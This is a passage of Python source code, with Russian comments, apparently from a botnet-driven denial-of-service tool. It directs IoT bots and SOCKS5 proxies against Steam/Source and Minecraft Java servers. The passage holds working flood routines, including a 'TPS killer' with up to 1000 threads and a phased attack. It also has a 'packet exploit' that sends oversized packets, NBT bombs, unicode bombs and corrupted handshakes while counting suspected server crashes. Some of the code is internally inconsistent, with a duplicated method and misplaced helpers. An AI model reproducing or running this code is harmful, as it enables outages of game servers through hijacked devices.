        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        all_active_bots = iot_bots + socks5_bots

        attack_stats = {
            'total_packets': 0,
            'total_bytes': 0,
            'failed_packets': 0,
            'steam_connections': 0,
            'auth_attempts': 0,
            'start_time': time.time(),
            'is_running': True
        }

        def steam_attack_single(device):
            packets_sent = 0
            bytes_sent = 0
            failed_packets = 0
            steam_connections = 0
            auth_attempts = 0
            
            try:
                bot_type = "SOCKS5" if device.bot_type == "socks5" else "IoT"
                print(f"🚀 {bot_type} {device.ip} начинает Steam Protocol атаку...")
                start_time = time.time()
                
                # Создаем UDP сокет
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(3)
                
                # Список Steam пакетов для атаки
                steam_packets = [
                    ('connect', self._create_steam_connect_packet),
                    ('challenge', self._create_steam_challenge_packet),
                    ('auth', self._create_steam_auth_packet),
                    ('datagram', self._create_steam_datagram_packet),
                    ('matchmaking', self._create_steam_matchmaking_packet),
                    ('rcon', self._create_steam_rcon_packet),
                    ('heartbeat', self._create_steam_heartbeat_packet),
                    ('invalid', self._create_steam_invalid_packet),
                ]
                
                # Веса для разных типов пакетов (частота отправки)
                packet_weights = [0.15, 0.10, 0.10, 0.20, 0.10, 0.15, 0.10, 0.10]
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Выбираем тип пакета с учетом весов
                        packet_type, packet_creator = random.choices(steam_packets, weights=packet_weights)[0]
                        
                        # Создаем пакет
                        steam_packet = packet_creator()
                        
                        # Отправляем пакет
                        sock.sendto(steam_packet, (target_ip, target_port))
                        
                        packets_sent += 1
                        bytes_sent += len(steam_packet)
                        
                        attack_stats['total_packets'] += 1
                        attack_stats['total_bytes'] += len(steam_packet)
                        
                        # Считаем специфичные типы пакетов
                        if packet_type == 'connect':
                            steam_connections += 1
                            attack_stats['steam_connections'] += 1
                        elif packet_type == 'auth':
                            auth_attempts += 1
                            attack_stats['auth_attempts'] += 1
                        
                        # Периодически проверяем ответы
                        if random.random() < 0.08:
                            try:
                                response = sock.recv(1024)
                                # Если получили ответ, усиливаем атаку
                                if response and len(response) > 0:
                                    # Отправляем дополнительные пакеты на ответ
                                    for _ in range(random.randint(1, 3)):
                                        follow_up_packet = self._create_steam_datagram_packet()
                                        sock.sendto(follow_up_packet, (target_ip, target_port))
                                        packets_sent += 1
                                        bytes_sent += len(follow_up_packet)
                                        attack_stats['total_packets'] += 1
                                        attack_stats['total_bytes'] += len(follow_up_packet)
                            except socket.timeout:
                                pass  # Таймаут - нормально для флуда
                        
                        # Реалистичное поведение - разная скорость
                        if device.bot_type == "socks5":
                            # SOCKS5 прокси медленнее
                            time.sleep(random.uniform(0.1, 0.3))
                        else:
                            # IoT устройства быстрее
                            time.sleep(random.uniform(0.01, 0.05))
                        
                    except Exception as e:
                        failed_packets += 1
                        attack_stats['failed_packets'] += 1
                        continue
                
                sock.close()
                
                mb_sent = bytes_sent / 1024 / 1024
                bot_type = "SOCKS5" if device.bot_type == "socks5" else "IoT"
                print(f"✅ {bot_type} {device.ip} отправил {packets_sent} Steam пакетов "
                      f"({mb_sent:.2f} МБ), подключений: {steam_connections}, auth: {auth_attempts}")
                
                return packets_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0

        return self._run_attack(all_active_bots, attack_stats, steam_attack_single, "Steam Protocol")

    def steam_combo_attack(self, target_ip, target_port=27015, duration=60):
        """Комбинированная Steam атака (Protocol + Query)"""
        print(f"💥 Запуск комбинированной Steam атаки на {target_ip}:{target_port}")
        
        attack_stats = {
            'protocol_packets': 0,
            'query_packets': 0,
            'total_impact': 0,
            'start_time': time.time()
        }
        
        # Запускаем обе атаки параллельно
        import threading
        
        def run_protocol_attack():
            try:
                result = self.steam_protocol_flood(target_ip, target_port, duration)
                attack_stats['protocol_packets'] = result if result else 0
            except Exception as e:
                print(f"❌ Ошибка Steam Protocol: {e}")

        def run_query_attack():
            try:
                # Source Engine Query Flood (будет реализован отдельно)
                result = self.source_engine_flood(target_ip, target_port, duration)
                attack_stats['query_packets'] = result if result else 0
            except Exception as e:
                print(f"❌ Ошибка Source Query: {e}")

        protocol_thread = threading.Thread(target=run_protocol_attack)
        query_thread = threading.Thread(target=run_query_attack)
        
        protocol_thread.daemon = True
        query_thread.daemon = True
        
        protocol_thread.start()
        query_thread.start()
        
        protocol_thread.join(timeout=duration + 10)
        query_thread.join(timeout=duration + 10)
        
        attack_stats['total_impact'] = attack_stats['protocol_packets'] + attack_stats['query_packets']
        
        print(f"\n🎯 РЕЗУЛЬТАТЫ КОМБИНИРОВАННОЙ STEAM АТАКИ:")
        print(f"🚀 Protocol пакетов: {attack_stats['protocol_packets']}")
        print(f"🎯 Query пакетов: {attack_stats['query_packets']}")
        print(f"💥 Общий impact: {attack_stats['total_impact']}")
        
        return attack_stats['total_impact']


    def _create_minecraft_handshake(self, protocol_version=758, state=1):
        """Создает Minecraft handshake packet"""
        packet_id = b'\x00'
        protocol_varint = self._create_varint(protocol_version)
        
        server_addr = self.target_ip.encode('utf-8')  # Используем self.target_ip
        server_addr_len = self._create_varint(len(server_addr))
        server_port = struct.pack('>H', self.target_port)  # Используем self.target_port
        
        next_state = self._create_varint(state)
        packet_data = packet_id + protocol_varint + server_addr_len + server_addr + server_port + next_state
        packet_length = self._create_varint(len(packet_data))
        
        return packet_length + packet_data

    def _create_minecraft_status_request(self):
        """Создает Minecraft status request packet"""
        # Packet ID (0x00 для status request)
        packet_id = b'\x00'
        packet_length = self._create_varint(len(packet_id))
        
        return packet_length + packet_id

    def _create_minecraft_ping_request(self):
        """Создает Minecraft ping request packet - ИСПРАВЛЕННЫЙ"""
        packet_id = b'\x01'
        # Исправляем ошибку timestamp
        timestamp = int(time.time() * 1000)
        # Ограничиваем размер timestamp
        safe_timestamp = timestamp & 0xFFFFFFFFFFFFFFFF
        payload = struct.pack('>Q', safe_timestamp)
        
        packet_data = packet_id + payload
        packet_length = self._create_varint(len(packet_data))
        
        return packet_length + packet_data

    def _create_minecraft_login_start(self, username=None):
        """Создает Minecraft login start packet"""
        if username is None:
            username = f'Player{random.randint(1000, 9999)}'
        
        # Packet ID (0x00 для login start)
        packet_id = b'\x00'
        
        # Username
        username_encoded = username.encode('utf-8')
        username_len = self._create_varint(len(username_encoded))
        
        packet_data = packet_id + username_len + username_encoded
        
        # UUID (optional, all zeros)
        packet_data += b'\x00'  # No UUID
        
        packet_length = self._create_varint(len(packet_data))
        
        return packet_length + packet_data

    def _create_minecraft_chat_message(self, message=None):
        """Создает Minecraft chat message packet"""
        if message is None:
            messages = [
                "Hello Server!",
                "lag test",
                "ping check",
                "connection test",
                "server status?",
                "anyone online?",
                "test message",
                "flood test"
            ]
            message = random.choice(messages)
        
        # Packet ID (0x03 для chat message)
        packet_id = b'\x03'
        
        # Message
        message_encoded = message.encode('utf-8')
        message_len = self._create_varint(len(message_encoded))
        
        packet_data = packet_id + message_len + message_encoded
        
        packet_length = self._create_varint(len(packet_data))
        
        return packet_length + packet_data

    def _create_minecraft_keep_alive(self):
        """Создает Minecraft keep alive packet"""
        # Packet ID (0x0F для keep alive)
        packet_id = b'\x0F'
        # Keep alive ID
        keep_alive_id = struct.pack('>Q', random.randint(1, 1000000))
        
        packet_data = packet_id + keep_alive_id
        packet_length = self._create_varint(len(packet_data))
        
        return packet_length + packet_data

    def _create_minecraft_player_position(self):
        """Создает Minecraft player position packet"""
        # Packet ID (0x11 для player position)
        packet_id = b'\x11'
        
        # Coordinates
        x = struct.pack('>d', random.uniform(-1000, 1000))
        y = struct.pack('>d', random.uniform(0, 256))
        z = struct.pack('>d', random.uniform(-1000, 1000))
        
        # On ground
        on_ground = b'\x01'
        
        packet_data = packet_id + x + y + z + on_ground
        packet_length = self._create_varint(len(packet_data))
        
        return packet_length + packet_data

    def _create_minecraft_invalid_packet(self):
        """Создает невалидные Minecraft пакеты"""
        invalid_packets = [
            # Слишком длинные пакеты
            self._create_varint(2000) + b'A' * 2000,
            # Неправильные packet IDs
            self._create_varint(1) + b'\xFF',
            # Поврежденные varints
            b'\xFF\xFF\xFF\xFF\xFF' + b'test',
            # Пустые пакеты
            self._create_varint(0),
            # Binary garbage
            os.urandom(500),
            # Очень большие пакеты
            self._create_varint(10000) + b'B' * 10000,
        ]
        return random.choice(invalid_packets)

    
    def _create_packet(self, packet_id, data=b''):
        """Создает Minecraft пакет с длиной и ID"""
        packet_data = self._create_varint(packet_id) + data
        length = self._create_varint(len(packet_data))
        return length + packet_data
    
    def _create_packet(self, packet_id, data=b''):
        """Создает Minecraft пакет с длиной и ID"""
        packet_data = self._create_varint(packet_id) + data
        length = self._create_varint(len(packet_data))
        return length + packet_data

    def _create_handshake(self, protocol_version=762, state=1):
        """Создает Handshake пакет"""
        host = self.target_ip.encode('utf-8')
        port = self.target_port
        
        data = b''
        data += self._create_varint(protocol_version)  # Protocol version
        data += self._create_varint(len(host)) + host  # Server host
        data += struct.pack('>H', port)  # Server port
        data += self._create_varint(state)  # Next state (1 for status, 2 for login)
        
        return self._create_packet(0x00, data)
    
    def _create_status_request(self):
        """Создает Status Request пакет"""
        return self._create_packet(0x00)
    
    def _create_ping_request(self):
        """Создает Ping Request пакет"""
        return self._create_packet(0x01, struct.pack('>Q', int(time.time() * 1000)))
    
    def _create_login_start(self):
        """Создает Login Start пакет"""
        username = f"Player_{random.randint(1000, 9999)}".encode('utf-8')
        data = self._create_varint(len(username)) + username
        data += b'\x00'  # No UUID
        return self._create_packet(0x00, data)
    
    def _create_chat_message(self):
        """Создает Chat Message пакет"""
        message = f"/msg {random.randint(1, 1000)} Hello!".encode('utf-8')
        data = self._create_varint(len(message)) + message
        data += b'\x00'  # No timestamp
        data += b'\x00'  # No salt
        data += b'\x00' * 8  # Empty signature
        data += b'\x00'  # No message count
        data += b'\x01\x00\x00\x00\x00'  # Acknowledged bits
        return self._create_packet(0x05, data)
    
    def _create_keep_alive(self):
        """Создает Keep Alive пакет"""
        return self._create_packet(0x12, struct.pack('>Q', random.randint(1, 1000000)))
    
    def _create_player_position(self):
        """Создает Player Position пакет"""
        data = struct.pack('>d', random.uniform(-1000, 1000))  # X
        data += struct.pack('>d', random.uniform(0, 256))      # Y
        data += struct.pack('>d', random.uniform(-1000, 1000)) # Z
        data += b'\x00'  # On ground
        return self._create_packet(0x14, data)
    
    def _create_invalid_packet(self):
        """Создает невалидный пакет для фаззинга"""
        invalid_packets = [
            b'\xff' * 100,  # Большой невалидный пакет
            b'\x00' * 50,   # Нулевые байты
            struct.pack('>I', 0xFFFFFFFF),  # Максимальный размер
            b'INVALID_PACKET_DATA_FOR_CRASH_TEST',
            self._create_varint(0xFFFFFF) + b'A' * 1000  # Большой VarInt
        ]
        return random.choice(invalid_packets)
    
    def _create_plugin_message(self):
        """Создает Plugin Message пакет"""
        channel = "minecraft:brand".encode('utf-8')
        data = b'CustomBrand\x00' * 10  # Дублируем данные для увеличения размера
        packet_data = self._create_varint(len(channel)) + channel
        packet_data += self._create_varint(len(data)) + data
        return self._create_packet(0x0B, packet_data)
    
    def _create_tab_complete(self):
        """Создает Tab Complete пакет"""
        text = "/give @a minecraft:diamond_sword{Enchantments:[{id:\"minecraft:sharpness\",lvl:32767}]}".encode('utf-8')
        data = self._create_varint(len(text)) + text
        data += b'\x00'  # Assume position
        return self._create_packet(0x07, data)
    
    def _create_window_click(self):
        """Создает Window Click пакет"""
        data = struct.pack('>b', 0)  # Window ID
        data += struct.pack('>h', random.randint(0, 45))  # Slot
        data += struct.pack('>b', 0)  # Button
        data += struct.pack('>h', 0)  # Action number
        data += b'\x00'  # Mode
        data += b'\x00\x00\x00\x00\x00\x00\x00\x00'  # Clicked item (empty)
        return self._create_packet(0x09, data)

    def tps_killer_attack(self, target_ip, target_port=25565, duration=60, intensity="extreme"):
        """
        Специализированная атака для снижения TPS Minecraft сервера
        
        intensity: "low", "medium", "high", "extreme"
        """
        print(f"⛏️ ЗАПУСК TPS KILLER АТАКИ НА {target_ip}:{target_port}")
        print(f"🎯 ИНТЕНСИВНОСТЬ: {intensity.upper()}")
        
        self.target_ip = target_ip
        self.target_port = target_port
        
        # Настройки интенсивности
        intensity_settings = {
            "low": {"workers": 50, "packets_per_sec": 10, "reconnect_freq": 5},
            "medium": {"workers": 200, "packets_per_sec": 25, "reconnect_freq": 3},
            "high": {"workers": 500, "packets_per_sec": 50, "reconnect_freq": 2},
            "extreme": {"workers": 1000, "packets_per_sec": 100, "reconnect_freq": 1}
        }
        
        settings = intensity_settings[intensity]
        
        attack_stats = {
            'total_packets': 0,
            'total_connections': 0,
            'handshakes': 0,
            'logins': 0,
            'status_requests': 0,
            'chat_messages': 0,
            'failed_operations': 0,
            'start_time': time.time(),
            'is_running': True
        }
        
        def tps_attack_worker(worker_id):
            packets_sent = 0
            connections_made = 0
            handshakes = 0
            logins = 0
            status_requests = 0
            chat_messages = 0
            failed_ops = 0
            
            try:
                print(f"🔧 Воркер {worker_id} начинает TPS атаку...")
                start_time = time.time()
                
                # Типы пакетов и их веса для разных фаз атаки
                packet_types = [
                    ('handshake_status', self._create_handshake, 0.15),
                    ('handshake_login', lambda: self._create_handshake(state=2), 0.15),
                    ('status_request', self._create_status_request, 0.10),
                    ('ping', self._create_ping_request, 0.08),
                    ('login', self._create_login_start, 0.12),
                    ('chat', self._create_chat_message, 0.10),
                    ('position', self._create_player_position, 0.08),
                    ('plugin_msg', self._create_plugin_message, 0.07),
                    ('tab_complete', self._create_tab_complete, 0.05),
                    ('window_click', self._create_window_click, 0.05),
                    ('invalid', self._create_invalid_packet, 0.05)
                ]
                
                sock = None
                last_reconnect = 0
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    current_time = time.time()
                    
                    # Переподключение при необходимости
                    if (sock is None or 
                        current_time - last_reconnect > settings['reconnect_freq'] or
                        random.random() < 0.1):
                        
                        if sock:
                            try:
                                sock.close()
                            except:
                                pass
                        
                        try:
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.settimeout(5)
                            sock.connect((target_ip, target_port))
                            connections_made += 1
                            attack_stats['total_connections'] += 1
                            last_reconnect = current_time
                        except Exception as e:
                            failed_ops += 1
                            attack_stats['failed_operations'] += 1
                            sock = None
                            time.sleep(0.1)
                            continue
                    
                    if sock:
                        try:
                            # Выбираем тип пакета
                            packet_names = [p[0] for p in packet_types]
                            packet_creators = [p[1] for p in packet_types]
                            weights = [p[2] for p in packet_types]
                            
                            packet_name, packet_creator = random.choices(
                                list(zip(packet_names, packet_creators)), 
                                weights=weights
                            )[0]
                            
                            # Создаем и отправляем пакет
                            packet = packet_creator()
                            sock.send(packet)
                            packets_sent += 1
                            attack_stats['total_packets'] += 1
                            
                            # Обновляем статистику по типам пакетов
                            if 'handshake' in packet_name:
                                handshakes += 1
                                attack_stats['handshakes'] += 1
                            elif packet_name == 'login':
                                logins += 1
                                attack_stats['logins'] += 1
                            elif packet_name == 'status_request':
                                status_requests += 1
                                attack_stats['status_requests'] += 1
                            elif packet_name == 'chat':
                                chat_messages += 1
                                attack_stats['chat_messages'] += 1
                            
                            # Периодически читаем ответы (создаем дополнительную нагрузку)
                            if random.random() < 0.3:
                                try:
                                    sock.settimeout(0.5)
                                    response = sock.recv(4096)
                                    # Если получили ответ, отправляем дополнительные пакеты
                                    if response:
                                        for _ in range(random.randint(1, 3)):
                                            extra_packet = random.choice(packet_creators)()
                                            sock.send(extra_packet)
                                            packets_sent += 1
                                            attack_stats['total_packets'] += 1
                                except socket.timeout:
                                    pass
                            
                        except Exception as e:
                            failed_ops += 1
                            attack_stats['failed_operations'] += 1
                            sock = None
                    
                    # Контроль скорости отправки пакетов
                    time.sleep(1.0 / settings['packets_per_sec'])
                
                # Закрываем соединение
                if sock:
                    try:
                        sock.close()
                    except:
                        pass
                
                print(f"✅ Воркер {worker_id}: {packets_sent} пакетов, {connections_made} соединений")
                return packets_sent
                
            except Exception as e:
                print(f"❌ Ошибка в воркере {worker_id}: {e}")
                return 0
        
        # Запускаем атаку
        print(f"🚀 Запускаем {settings['workers']} воркеров...")
        
        total_packets = 0
        with ThreadPoolExecutor(max_workers=settings['workers']) as executor:
            futures = []
            for i in range(settings['workers']):
                future = executor.submit(tps_attack_worker, i)
                futures.append(future)
            
            for future in futures:
                try:
                    packets = future.result(timeout=duration + 10)
                    total_packets += packets
                except:
                    pass
        
        # Статистика атаки
        total_time = time.time() - attack_stats['start_time']
        packets_per_second = attack_stats['total_packets'] / total_time if total_time > 0 else 0
        
        print(f"\n🎯 TPS KILLER АТАКА ЗАВЕРШЕНА:")
        print(f"📊 Всего пакетов: {attack_stats['total_packets']:,}")
        print(f"🔗 Соединений: {attack_stats['total_connections']:,}")
        print(f"🤝 Handshakes: {attack_stats['handshakes']:,}")
        print(f"🔑 Logins: {attack_stats['logins']:,}")
        print(f"📡 Status запросов: {attack_stats['status_requests']:,}")
        print(f"💬 Chat сообщений: {attack_stats['chat_messages']:,}")
        print(f"⚡ Скорость: {packets_per_second:.1f} пакетов/сек")
        print(f"🚫 Ошибок: {attack_stats['failed_operations']}")
        print(f"⏱️ Время: {total_time:.2f} сек")
        
        return total_packets

    def smart_tps_attack(self, target_ip, target_port=25565, duration=300):
        """
        Умная адаптивная атака для максимального снижения TPS
        """
        print(f"🧠 ЗАПУСК SMART TPS АТАКИ НА {target_ip}:{target_port}")
        
        phases = [
            ("🔄 Фаза 1: Разведка", 30, "low"),
            ("⚡ Фаза 2: Наращивание", 60, "medium"), 
            ("💥 Фаза 3: Пиковая нагрузка", 120, "extreme"),
            ("🎯 Фаза 4: Точечная атака", 90, "high")
        ]
        
        total_packets = 0
        
        for phase_name, phase_duration, intensity in phases:
            print(f"\n{phase_name} ({phase_duration} сек, {intensity})")
            
            phase_packets = self.tps_killer_attack(
                target_ip, target_port, 
                duration=phase_duration, 
                intensity=intensity
            )
            
            total_packets += phase_packets
            print(f"📦 Пакетов в фазе: {phase_packets:,}")
            
            # Пауза между фазами
            if phase_name != phases[-1][0]:
                print("⏸️ Пауза между фазами...")
                time.sleep(5)
        
        print(f"\n🎉 SMART TPS АТАКА ЗАВЕРШЕНА!")
        print(f"📊 Всего отправлено пакетов: {total_packets:,}")
        
        return total_packets

    def minecraft_java_packet_exploit(self, target_ip, target_port=25565, duration=60, exploit_type="auto"):
        """Minecraft Java Edition - эксплойты с пакетами данных"""
        
        self.target_ip = target_ip
        self.target_port = target_port
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")
        print(f"🎯 Цель: {target_ip}:{target_port}")
        print(f"⚡ Тип эксплойта: {exploit_type}")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        all_active_bots = iot_bots + socks5_bots

        attack_stats = {
            'total_packets': 0,
            'total_bytes': 0,
            'failed_packets': 0,
            'exploit_attempts': 0,
            'crashes_detected': 0,
            'start_time': time.time(),
            'is_running': True
        }

        def create_malicious_packet(exploit_type):
            """Создает вредоносные пакеты разных типов"""
            
            if exploit_type == "oversized" or random.random() < 0.4:
                # Пакеты с огромным размером
                size = random.choice([65535, 131072, 262144, 524288])  # До 512KB
                return b'\x00' + self._create_varint(size) + b'A' * min(size, 10000)
                
            elif exploit_type == "invalid_varint" or random.random() < 0.3:
                # Невалидные VarInt (бесконечные)
                return b'\x00' + b'\xFF' * 10 + b'\x00'
                
            elif exploit_type == "nbt_bomb" or random.random() < 0.2:
                # NBT бомба (чрезмерно вложенные теги)
                return self._create_nbt_bomb_packet()
                
            elif exploit_type == "unicode_bomb" or random.random() < 0.1:
                # Unicode бомба
                return self._create_unicode_bomb_packet()
                
            else:
                # Специально сформированные пакеты рукопожатия
                return self._create_corrupted_handshake()

        def _create_nbt_bomb_packet(self):
            """Создает NBT бомбу - чрезмерно вложенные теги"""
            # Базовый NBT с глубокой вложенностью
            nbt_data = b'\x0A'  # TAG_Compound
            nbt_data += b'\x00\x04' + 'nest'.encode('utf-8')  # Имя тега
            
            # Создаем глубокую вложенность (30 уровней)
            for i in range(30):
                nbt_data += b'\x0A'  # TAG_Compound
                nbt_data += b'\x00\x04' + 'nest'.encode('utf-8')
            
            # Завершаем все теги
            nbt_data += b'\x00' * 30  # END_TAG для каждого уровня
            
            packet = b'\x00' + self._create_varint(len(nbt_data)) + nbt_data
            return packet

        def _create_unicode_bomb_packet(self):
            """Создает пакет с огромным количеством Unicode символов"""
            # Используем символы, которые могут вызвать проблемы с обработкой
            unicode_bomb = '🚀' * 5000  # 5000 эмодзи
            # Или комбинация разных Unicode символов
            unicode_bomb += '█' * 10000
            
            message_data = b'\x00' + self._create_string(unicode_bomb)
            packet = b'\x05' + self._create_varint(len(message_data)) + message_data
            return packet

        def _create_corrupted_handshake(self):
            """Создает поврежденное рукопожатие"""
            protocol_version = b'\xFF\xFF\xFF\xFF'  # Невалидная версия протокола
            server_address = self._create_string("A" * 255)  # Максимально длинный адрес
            server_port = b'\xFF\xFF'  # Невалидный порт
            next_state = b'\x02'  # Login state
            
            handshake = b'\x00' + protocol_version + server_address + server_port + next_state
            return handshake

        def _create_string(self, text):
            """Создает строку в формате Minecraft"""
            text_bytes = text.encode('utf-8') if isinstance(text, str) else text
            return self._create_varint(len(text_bytes)) + text_bytes

        def _create_varint(self, value):
            """Создает VarInt - может быть использован для создания проблем"""
            if value > 0x1FFFFFFF:  # Создаем слишком большой VarInt
                return b'\xFF\xFF\xFF\xFF\x0F'
            
            result = b''
            while True:
                temp = value & 0x7F
                value >>= 7
                if value != 0:
                    temp |= 0x80
                result += bytes([temp])
                if value == 0:
                    break
            return result

        def minecraft_exploit_single(device):
            packets_sent = 0
            bytes_sent = 0
            failed_packets = 0
            exploit_attempts = 0
            
            try:
                bot_type = "SOCKS5" if device.bot_type == "socks5" else "IoT"
                print(f"💣 {bot_type} {device.ip} начинает packet exploit атаку...")
                start_time = time.time()
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Создаем новое соединение для каждого эксплойта
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(3)
                        
                        # Быстрое соединение
                        sock.connect((target_ip, target_port))
                        
                        # Отправляем несколько вредоносных пакетов
                        for _ in range(random.randint(3, 10)):
                            exploit_packet = create_malicious_packet(exploit_type)
                            
                            try:
                                sock.send(exploit_packet)
                                packets_sent += 1
                                bytes_sent += len(exploit_packet)
                                exploit_attempts += 1
                                
                                attack_stats['total_packets'] += 1
                                attack_stats['total_bytes'] += len(exploit_packet)
                                attack_stats['exploit_attempts'] += 1
                                
                                # Проверяем, не упал ли сервер
                                try:
                                    sock.settimeout(1)
                                    response = sock.recv(1)
                                    if not response:  # Соединение закрыто
                                        attack_stats['crashes_detected'] += 1
                                        print(f"💥 Возможный краш сервера обнаружен {device.ip}!")
                                        break
                                except socket.timeout:
                                    pass  # Сервер не отвечает - возможно, перегружен
                                except ConnectionResetError:
                                    attack_stats['crashes_detected'] += 1
                                    print(f"💥 Сервер разорвал соединение (возможный краш) от {device.ip}!")
                                    break
                                    
                            except Exception as e:
                                failed_packets += 1
                                attack_stats['failed_packets'] += 1
                                break
                        
                        sock.close()
                        
                        # Разная агрессивность для разных типов ботов
                        if device.bot_type == "socks5":
                            time.sleep(random.uniform(0.2, 0.8))
                        else:
                            time.sleep(random.uniform(0.1, 0.4))
                            
                    except Exception as e:
                        failed_packets += 1
                        attack_stats['failed_packets'] += 1
                        try:
                            sock.close()
                        except:
                            pass
                        continue
                
                mb_sent = bytes_sent / 1024 / 1024
                print(f"✅ {bot_type} {device.ip}: {packets_sent} эксплойт-пакетов "
                      f"({mb_sent:.2f} МБ), попыток: {exploit_attempts}")
                
                return packets_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0

        # Запускаем атаку
        result = self._run_attack(all_active_bots, attack_stats, minecraft_exploit_single, "Minecraft Packet Exploit")
        
        # Финальная статистика
        print(f"\n📊 Итоги Packet Exploit атаки:")
        print(f"📨 Всего пакетов: {attack_stats['total_packets']}")
        print(f"💾 Объем данных: {attack_stats['total_bytes'] / 1024 / 1024:.2f} МБ")
        print(f"💥 Попыток эксплойтов: {attack_stats['exploit_attempts']}")
        print(f"🚨 Обнаружено возможных крашей: {attack_stats['crashes_detected']}")
        print(f"❌ Неудачных пакетов: {attack_stats['failed_packets']}")
        
        return result

    def minecraft_java_flood(self, target_ip, target_port=25565, duration=60):
        """Minecraft Java Edition flood атака"""
        # Сохраняем target_ip и target_port для использования в методах
        self.target_ip = target_ip
        self.target_port = target_port
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        all_active_bots = iot_bots + socks5_bots

        attack_stats = {
            'total_packets': 0,
            'total_bytes': 0,
            'failed_packets': 0,
            'handshakes': 0,
            'login_attempts': 0,
            'ping_attempts': 0,
            'start_time': time.time(),
            'is_running': True
        }

        def minecraft_attack_single(device):
            packets_sent = 0
            bytes_sent = 0
            failed_packets = 0
            handshakes = 0
            login_attempts = 0
            ping_attempts = 0
            
            try:
                bot_type = "SOCKS5" if device.bot_type == "socks5" else "IoT"
                print(f"⛏️ {bot_type} {device.ip} начинает Minecraft Java атаку...")
                start_time = time.time()
                
                # Создаем TCP сокет (Minecraft Java использует TCP)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                
                # Список Minecraft пакетов для атаки
                minecraft_packets = [
                    ('handshake_status', lambda: self._create_minecraft_handshake(state=1)),
                    ('handshake_login', lambda: self._create_minecraft_handshake(state=2)),
                    ('status_request', self._create_minecraft_status_request),
                    ('ping_request', self._create_minecraft_ping_request),
                    ('login_start', self._create_minecraft_login_start),
                    ('chat_message', self._create_minecraft_chat_message),
                    ('keep_alive', self._create_minecraft_keep_alive),
                    ('player_position', self._create_minecraft_player_position),
                    ('invalid', self._create_minecraft_invalid_packet),
                ]
                
                # Веса для разных типов пакетов
                packet_weights = [0.15, 0.15, 0.10, 0.10, 0.15, 0.10, 0.10, 0.05, 0.10]
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Периодически переподключаемся
                        if packets_sent % 20 == 0 or not sock:
                            try:
                                sock.close()
                            except:
                                pass
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.settimeout(5)
                            sock.connect((target_ip, target_port))
                        
                        # Выбираем тип пакета
                        packet_type, packet_creator = random.choices(minecraft_packets, weights=packet_weights)[0]
                        
                        # Создаем пакет
                        minecraft_packet = packet_creator()
                        
                        # Отправляем пакет
                        sock.send(minecraft_packet)
                        
                        packets_sent += 1
                        bytes_sent += len(minecraft_packet)
                        
                        attack_stats['total_packets'] += 1
                        attack_stats['total_bytes'] += len(minecraft_packet)
                        
                        # Считаем специфичные типы пакетов
                        if 'handshake' in packet_type:
                            handshakes += 1
                            attack_stats['handshakes'] += 1
                        elif packet_type == 'login_start':
                            login_attempts += 1
                            attack_stats['login_attempts'] += 1
                        elif packet_type == 'ping_request':
                            ping_attempts += 1
                            attack_stats['ping_attempts'] += 1
                        
                        # Периодически читаем ответы
                        if random.random() < 0.1:
                            try:
                                # Читаем ответ (может быть большим)
                                response = sock.recv(4096)
                                if response and len(response) > 0:
                                    # Если сервер отвечает, усиливаем атаку
                                    for _ in range(random.randint(1, 3)):
                                        follow_up_packet = self._create_minecraft_chat_message()
                                        sock.send(follow_up_packet)
                                        packets_sent += 1
                                        bytes_sent += len(follow_up_packet)
                                        attack_stats['total_packets'] += 1
                                        attack_stats['total_bytes'] += len(follow_up_packet)
                            except socket.timeout:
                                pass  # Таймаут - нормально
                        
                        # Разная скорость для разных типов ботов
                        if device.bot_type == "socks5":
                            time.sleep(random.uniform(0.1, 0.5))
                        else:
                            time.sleep(random.uniform(0.05, 0.2))
                        
                    except Exception as e:
                        failed_packets += 1
                        attack_stats['failed_packets'] += 1
                        # Пытаемся переподключиться
                        try:
                            sock.close()
                        except:
                            pass
                        sock = None
                        continue
                
                # Закрываем соединение
                try:
                    sock.close()
                except:
                    pass
                
                mb_sent = bytes_sent / 1024 / 1024
                bot_type = "SOCKS5" if device.bot_type == "socks5" else "IoT"
                print(f"✅ {bot_type} {device.ip} отправил {packets_sent} Minecraft пакетов "
                      f"({mb_sent:.2f} МБ), handshakes: {handshakes}, logins: {login_attempts}")
                
                return packets_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0

        return self._run_attack(all_active_bots, attack_stats, minecraft_attack_single, "Minecraft Java")

    def minecraft_java_combo_attack(self, target_ip, target_port=25565, duration=60):
        """Комбинированная Minecraft Java атака"""
        print(f"💥 Запуск комбинированной Minecraft Java атаки на {target_ip}:{target_port}")
        
        attack_stats = {
            'protocol_packets': 0,
            'query_packets': 0,
            'total_impact': 0,
            'start_time': time.time()
        }
        
        # Запускаем разные типы атак параллельно
        import threading
        
        def run_protocol_attack():
            try:
                result = self.minecraft_java_flood(target_ip, target_port, duration)
